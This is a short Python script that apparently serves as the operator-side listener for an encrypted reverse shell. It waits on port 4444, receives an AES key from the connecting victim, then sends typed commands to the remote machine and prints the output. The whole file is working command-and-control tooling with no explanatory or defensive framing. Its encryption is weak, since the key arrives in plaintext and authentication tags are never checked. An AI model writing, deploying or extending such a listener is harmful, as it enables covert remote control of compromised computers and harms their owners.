from Crypto.Cipher import AES
from secrets import token_bytes
import socket
import struct

key = b'A'*32

def enc_send(sock, msg):
    nonce = token_bytes(12)
    aes = AES.new(key, AES.MODE_GCM, nonce)
    enc_msg = aes.encrypt(msg)
    sock.sendall(struct.pack('<Q', len(enc_msg)))
    sock.sendall(enc_msg)
    sock.sendall(nonce)


def enc_recv(sock):
    nbytes = struct.unpack('<Q', sock.recv(8))[0]
    enc_msg = sock.recv(nbytes)
    nonce = sock.recv(12)
    aes = AES.new(key, AES.MODE_GCM, nonce)
    return aes.decrypt(enc_msg)

def main():
    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssock.bind(('', 4444))
    ssock.listen()
    print("Listening")

    (csock, addr) = ssock.accept()
    csock.settimeout(2)
    print(f"Connection received from {addr}")
    
    global key
    key = csock.recv(32) 

    while True:
        cmd = input("> ").encode()
        enc_send(csock, cmd)
        if cmd == b'disconnect':
            return
        print(enc_recv(csock).decode())


if __name__ == "__main__":
    main()
